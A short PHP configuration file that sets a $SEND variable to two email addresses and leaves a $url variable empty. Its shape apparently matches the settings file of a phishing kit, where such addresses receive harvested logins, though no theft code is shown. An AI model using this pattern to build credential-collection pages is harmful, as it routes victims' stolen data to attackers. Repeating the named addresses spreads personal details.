<?php

$SEND="gafarighana2020@gmail.com,goldboygh2020@fastmail.com"; 
$url ="";

?>